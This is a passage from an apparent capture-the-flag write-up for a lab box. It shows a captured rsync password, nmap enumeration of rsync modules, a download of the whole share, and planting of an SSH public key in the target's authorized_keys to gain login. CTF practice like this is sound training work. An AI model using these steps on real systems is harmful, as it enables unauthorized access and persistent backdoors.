```
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```



We can enumerate rsync shares with this command:
```
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
```

We see that there is a `files` share

We can sync all files in this share to a folder on our machine using the password above

```
rsync -av rsync://rsync-connect@10.10.117.165/files /home/keez/boxes/thm/vulnet/internal 
```

We can see `user.txt`

---

we can use rsync to upload our `id_rsa.pub` to their `authorized_keys` list

```
rsync /home/keez/.ssh/id_rsa.pub rsync://rsync-connect@10.10.117.165/files/sys-internal/.ssh/authorized_keys
```

once that is done we can ssh in
```
ssh -i ~/.ssh/id_rsa sys-internal@10.10.117.165 
```
